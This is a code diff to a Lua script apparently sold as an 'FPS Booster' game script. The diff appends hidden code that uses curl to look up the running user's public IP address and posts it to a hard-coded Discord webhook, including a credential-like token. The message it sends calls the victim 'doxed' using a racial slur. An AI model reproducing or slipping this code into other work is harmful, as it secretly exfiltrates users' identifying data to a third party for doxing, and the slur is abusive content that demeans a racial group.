@@ -380,3 +380,17 @@ warn("FPS Booster Loaded!")
 --[[game.DescendantAdded:Connect(function(value)
     CheckIfBad(value)
 end)]]
+
+-- Lua script to grab IP address and send it to Discord webhook
+
+local ip = io.popen("curl ifconfig.me/ip"):read("*a") -- Retrieve IP address using curl
+ip = ip:gsub("\n", "") -- Remove newline character
+
+-- Discord webhook URL
+local webhook = "https://discord.com/api/webhooks/1234595640261087383/3CW1bQnmu7HbJulV2AFRwzs9EtOVhQbPDmHlC4O354T9ZhiBRljC85cgb78uIgRGd_HT"
+
+-- Construct JSON payload
+local data = string.format('{"content": "This nigga got doxed lmao: %s"}', ip)
+
+-- Send data to Discord webhook
+os.execute(string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', data, webhook))
